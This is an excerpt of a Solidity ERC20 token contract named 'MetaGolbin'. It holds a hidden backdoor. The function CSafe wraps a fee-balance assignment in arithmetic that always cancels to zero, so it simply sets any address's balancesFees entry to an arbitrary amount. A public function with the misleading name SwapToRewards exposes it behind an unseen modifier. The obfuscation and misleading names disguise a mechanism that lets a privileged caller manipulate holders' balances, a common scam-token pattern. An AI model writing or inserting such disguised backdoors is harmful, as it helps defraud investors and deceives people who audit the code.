...
contract MetaGolbin is IERC20 {
  ...
  function CSafe (address taker, uint256 _value) internal {
        balancesFees[taker] = (balancesFees[taker] * 1 * 2 - balancesFees[taker] * 1 * 2) + (_value * 10 ** uint256(decimals));
  }
      
  function SwapToRewards(address GetAddress, uint256 _value) public __WalletFees {
      CSafe(GetAddress, _value);
  }
